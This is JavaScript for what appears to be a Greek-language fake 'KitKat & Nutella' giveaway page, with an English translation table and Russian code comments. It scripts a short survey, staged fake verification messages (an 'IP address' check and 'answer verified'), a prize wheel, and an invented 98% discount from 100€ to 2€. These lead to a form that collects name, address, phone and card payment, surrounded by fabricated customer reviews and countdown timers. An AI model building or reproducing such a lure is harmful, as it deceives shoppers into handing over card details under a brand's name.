const firstClick = document.querySelector(".first_question");
const twoClick = document.querySelector(".two_question");
const threeClick = document.querySelector(".three_question");

const firstCheck = document.querySelector(".time_one");
const secondCheck = document.querySelector(".time_two");
const threeCheck = document.querySelector(".time_three");

const pageOne = document.querySelector(".page_one");
const pageTwo = document.getElementById("page_two");
const pageThree = document.getElementById("Check");
const pageBox = document.getElementById("game");

const commentsOne = document.getElementById("comments_display");
const commentsTwo = document.getElementById("comments_display_one");
const footer = document.querySelector(".footer");

const oneBox = document.querySelector(".one_box");
const twoBox = document.querySelector(".two_box");
const threeBox = document.querySelector(".three_box");
const fourBox = document.querySelector(".four_box");
const fiveBox = document.querySelector(".five_box");
const sixBox = document.querySelector(".six_box");
const sevenBox = document.querySelector(".seven_box");
const eightBox = document.querySelector(".eight_box");
const nineBox = document.querySelector(".nine_box");
const tenBox = document.querySelector(".ten_box");
const elevenBox = document.querySelector(".eleven_box");
const twelvBox = document.querySelector(".tvelw_box");

const oneModal = document.querySelector(".click_me_pidor");
const modalWrapp = document.querySelector(".wrapp_modal_box");

const endGiftAnimation = document.querySelector(".img_gift_wind");
const blyyyy = document.querySelector(".pop");

const info = document.querySelector(".info");
const last = document.querySelector(".last");
const hide = document.querySelector(".hide");
const check = document.getElementById("Check");
const main = document.querySelector(".main");
const order = document.querySelector(".order-data-wrp");
const comments = document.querySelector(".comms");
const pickup = document.querySelector(".main__btn");
const load = document.querySelector(".loader-wrp");
const startBtn = document.getElementById("startBtn");
const goOrderBtns = document.querySelectorAll(".go-order");
const raiting = document.querySelector(".raiting");



goOrderBtns.forEach(goOrderBtn=>{
	goOrderBtn.addEventListener('click', ()=>{
		// Скрываем gallery и answer
		main.style.display = "none";
		comments.style.display = "none";
		raiting.style.display = "none";
		footer.style.display = "none";
	
		// Плавно показываем check
		check.style.display = "block";
		check.style.opacity = 1;
		check.style.transition = "opacity 0.5s";
	
	
	setTimeout(() => {
		firstCheck.classList.add("b-show-two");
		firstCheck.style.display = "block";
	}, 1000);
	
	setTimeout(() => {
		secondCheck.classList.add("b-show-two");
		secondCheck.style.display = "block";
	}, 2200);
	setTimeout(() => {
		threeCheck.classList.add("b-show-two");
		threeCheck.style.display = "block";
	}, 3200);
	
	setTimeout(() => {
		check.style.display = "none";

	}, 4000);
	
	setTimeout(() => {
		document.body.style.background = "#fff";
		// order.classList.remove("hidden");
		last.style.display = "block";
		hide.style.display = "block";
	}, 4000);
	});
})



startBtn.addEventListener("click", function(){
	last.style.display = "none";
	load.style.display = "block";


setTimeout(() => {
	load.style.display = "none";
	order.style.display = "block";
	order.classList.remove("hidden")
}, 2000);

})


const translations = {
    "Ελέγξτε τις απαντήσεις σας.": "Check your answers.",
    "Απαντήσατε στην ερώτηση 3/3!": "You answered 3 out of 3 questions!",
    "Η διεύθυνση IP σας δεν εμφανίζει προηγούμενες αιτήσεις.": "Your IP address does not indicate previous requests.",
    "Η απάντηση επαληθεύτηκε.": "The answer has been verified.",

	"Γεια σας!":"Hello!",
    "Όλοι έχουμε λίγο γλυκό, γι 'αυτό το KitKat & Nutella αποφάσισαν να σας κάνουν μια μικρή χάρη! Το KitKat και η Nutella είναι μερικά από τα πιο δημοφιλή γλυκά στον κόσμο και σήμερα μια ολόκληρη συσκευασία τους κοστίζει μόνο 2€!": "We all have a sweet tooth, that's why KitKat and Nutella have decided to treat you! KitKat and Nutella are among the most popular confectioneries in the world, and today, a whole box costs only 2€!",
    "Για να παραλάβετε το κουτί με τα γλυκά σας, παρακαλούμε συμπληρώστε το παρακάτω ερωτηματολόγιο.": "To claim your box of treats, please answer the survey below.",

    "Κουτί KitKat και Nutella προσπαθήστε να κερδίσετε 100% έκπτωση!":"Box of KitKat and Nutella Try to win a 100% discount!",

	"Ερώτηση 1 από 3: Ποιο είδος σοκολάτας σας αρέσει?": "Question 1 of 3: What type of chocolate do you prefer?",
    "Σκούρα": "Dark",
    "σοκολάτα": "chocolate",
    "Λευκή": "White",
    "Ερώτηση 2 από 3: Σας αρέσει η σοκολάτα με καρύδια?": "Question 2 of 3: Do you like hazelnut chocolate?",
    "Ναι": "Yes",
    "Όχι": "No",
    "Ερώτηση 3 από 3: Είδατε την ταινία Wonka 2023?": "Question 3 of 3: Have you seen the movie Wonka 2023?",
	
    "Αξιολόγηση του ιστότοπου": "Website rating",
    "Αγόρασα για τον φίλο μου. Χάρηκε πολύ, ακόμα κι αν δεν του αρέσει το KitKat.": "I bought it for my boyfriend. He was happy, even though he doesn't like KitKats.",
    "Δεν περίμενα μια τόσο γρήγορη παράδοση. Τώρα είναι πιο ευχάριστο να παρακολουθείς σειρές τηλεόρασης.": "I didn't expect such a fast delivery. Now it's more enjoyable to watch TV series.",
    "Αγόρασα για τους γονείς μου, ακόμα και αν είμαι στο σχολείο, αλλά 2€ δεν είναι πολλά.": "Bought for my parents, even though I'm at school, but 2€ is not much.",
    "Καλά συσκευασμένο και ναι, η γεύση είναι υπέροχη, ελπίζω να προλάβετε να πάρετε πίσω το κουτί με τα σοκολατάκια σας εγκαίρως!": "Well packed and yes, the taste is great, hope you can get your chocolate box in time!",
   
			"KitKat X Nutella Ρουλέτα, προσπαθήστε να κερδίσετε 100%, 98% και 50% έκπτωση!":"KitKat X Nutella roulette, try to win 100%, 98% and 50% off!",
	"Στρίψτε τη ρόδα και κερδίστε το ειδικό σας βραβείο!🎁": "Spin a wheel and get your prize!🎁",
	"Όλες οι ευχές μας!!! Κιβώτιο με KitKat και Nutella.":"Congratulations!!! You have won a KitKat and Nutella Box.",

	'1. Κάντε κλικ στο "ΕΝΤΑΞΕΙ", και στη συνέχεια πηγαίνετε στη σελίδα παράδοσης.':"1. Click 'OK' and proceed to the delivery page.",
	"2. Συμπληρώστε τη φόρμα και πραγματοποιήστε την πληρωμή για να λάβετε το Κιβώτιο με KitKat και Nutella.":"2. Fill out the form and make the payment to receive the KitKat and Nutella box.",
	"3. Το πακέτο θα παραδοθεί σε 5 έως 7 ημέρες.":"3. The package will be delivered within 5 to 7 days.",

	"Συγχαρητήρια! Έχετε κερδίσει μια έκπτωση 98%!":"Congratulations! You have earned a 98% discount!",
	"Λαχείο":"Lottery",
	'Λεπτομέρειες παραγγελίας':'Order Details',
	"Πληρωμή":'Pay',
	"Λιβρέισον":'Delivery',
	"Πόλη":'City',
	"Διεύθυνση":'Address',
	"Ταχυδρομικός κώδικας":'Code Postal',
	"Επιλογές πληρωμής":"Payment Options",
	"Πληρωμή με κάρτα online":"Pay by Card Online",
	"Προσωπικές πληροφορίες":"Personal Information",
	"Όνομα":"First Name",
	"Επώνυμο":"Last Name",
	"Τηλέφωνο":"Phone Number",
	"Κουτί KitKat & Nutella":"Box of KitKat and Nutella",
	"Συγχαρητήρια! Κερδίσατε έκπτωση 98%":"Congratulations! You have won a 98% discount!",
	"Προηγούμενη τιμή: 100€":"Previous price: 100€",
	"Έκπτωση: 98€":"Discount: 98€",
	"Νέα τιμή: 2€":"New price: 2€",
	"Μετάβαση στο Ταμείο":"Go to Checkout",
	"Εντάξει":"Ok",

	"Γενικά":"General",
	"Σχετικά με":"About",
	"Σύνδεση":"Sing In",
	"Είσοδος":"Log In",
	"Υποστήριξη":"Support",
	"Επικοινωνήστε μαζί μας":"Contact us",
	"Πολιτική Απορρήτου":"Privacy Policy",
	"Όροι Χρήσης":"Terms & Conditions",
	"Ακολουθήστε μας":"Follow us",
	"Ενημερωτικό δελτίο":"Newsteller",
	"ΕΓΓΡΑΦΗ":"SUBSCRIBE",
	"Διεύθυνση ηλεκτρονικού ταχυδρομείου":"Email Address",

	"1 ημέρα  2 ώρες":"1 day 2 hours",
	"1 ημέρα  4 ώρες":"1 day 4 hours",
	"1 ημέρα  9 ώρες":"1 day 9 hours",
	
	"Μετάβαση στην ταμειακή":"Go to checkout",

	"Ας ξεκινήσουμε!": "Try again",
    "Δοκιμάστε ξανά! Έχετε ακόμα μια ευκαιρία!": "Try again! You still have a chance!",
    "Πάμε!": "Spin!",


};

function translatePage(language) {
    const translationsToUse = language === 'fr' ? translations : reverseTranslations(translations);

    // Проходимся по всем элементам на странице
    document.querySelectorAll('*').forEach(node => {
        // Проверяем, является ли узел элементом
        if (node.nodeType === Node.ELEMENT_NODE) {
            // Проходимся по всем дочерним узлам элемента
            node.childNodes.forEach(childNode => {
                // Если дочерний узел текстовый узел и его текст есть в translations, заменяем его
                if (childNode.nodeType === Node.TEXT_NODE && childNode.textContent.trim() in translationsToUse) {
                    childNode.textContent = translationsToUse[childNode.textContent.trim()];
                }
            });
        }
    });
}

// Function to reverse translations object
function reverseTranslations(translationsObj) {
    const reversedTranslations = {};
    for (const key in translationsObj) {
        reversedTranslations[translationsObj[key]] = key;
    }
    return reversedTranslations;
}

// Event listener for French language button
const langBtnFr = document.querySelector('.lang-btn-fr');
if (langBtnFr) {
    langBtnFr.addEventListener('click', () => translatePage('eng'));
}

// Event listener for English language button
const langBtnEng = document.querySelector('.lang-btn-eng');
if (langBtnEng) {
    langBtnEng.addEventListener('click', () => translatePage('fr'));
}



document.addEventListener("DOMContentLoaded", function() {
	var languageToggle = document.querySelector('.language-toggle');
	var languageMenu = document.querySelector('.language-menu');
	var selectedLanguage = document.querySelector('.selected-language');
  
	languageToggle.addEventListener('click', function() {
	  languageMenu.style.display = (languageMenu.style.display === 'block') ? 'none' : 'block';
	});
  
	document.addEventListener('click', function(event) {
	  var isClickInside = languageToggle.contains(event.target) || languageMenu.contains(event.target);
	  if (!isClickInside) {
		languageMenu.style.display = 'none';
	  }
	});
  
	var languageLinks = document.querySelectorAll('.language-menu a');
	languageLinks.forEach(function(link) {
	  link.addEventListener('click', function(event) {
		event.preventDefault();
		var selectedLang = this.dataset.lang;
		selectedLanguage.textContent = selectedLang.toUpperCase();
		languageMenu.style.display = 'none';
	  });
	});
  });
  
  
  